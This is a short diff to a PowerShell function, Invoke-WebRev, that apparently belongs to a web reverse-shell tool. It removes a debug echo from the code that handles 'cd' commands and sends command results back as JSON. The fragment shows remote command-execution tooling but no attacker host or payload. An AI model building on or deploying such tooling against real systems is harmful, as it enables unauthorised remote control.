@@ -102,7 +102,6 @@ function Invoke-WebRev{
 
             if ($cstr.split(" ")[0] -eq "cd") {
                 $pwd_b64 = getPwd;
-                echo "entro";
             }
             $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '"}';
         }
